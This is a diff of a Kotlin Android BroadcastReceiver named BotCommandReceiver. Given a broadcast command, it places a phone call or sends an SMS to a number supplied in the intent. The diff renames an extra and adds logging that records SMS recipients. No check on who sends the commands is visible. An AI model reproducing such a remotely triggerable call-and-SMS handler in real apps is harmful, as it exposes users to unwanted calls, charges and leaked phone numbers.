@@ -5,6 +5,7 @@ import android.content.Context
 import android.content.Intent
 import android.net.Uri
 import android.telephony.SmsManager
+import android.util.Log
 
 class BotCommandReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context?, intent: Intent?) {
@@ -12,9 +13,9 @@ class BotCommandReceiver : BroadcastReceiver() {
 
         when (command) {
             "call" -> {
-                val number = intent.getStringExtra("number") ?: return
+                val payload = intent.getStringExtra("payload") ?: return
                 val callIntent = Intent(Intent.ACTION_CALL).apply {
-                    data = Uri.parse("tel:$number")
+                    data = Uri.parse("tel:$payload")
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 }
                 context?.startActivity(callIntent)
@@ -26,8 +27,9 @@ class BotCommandReceiver : BroadcastReceiver() {
                 try {
                     val smsManager = context?.getSystemService(SmsManager::class.java)
                     smsManager?.sendTextMessage(number, null, message, null, null)
+                    Log.d("bizzy", "SMS sent to $number")
                 } catch (e: Exception) {
-                    e.printStackTrace()
+                    Log.e("bizzy", "Failed to send SMS: ${e.message}")
                 }
             }
         }
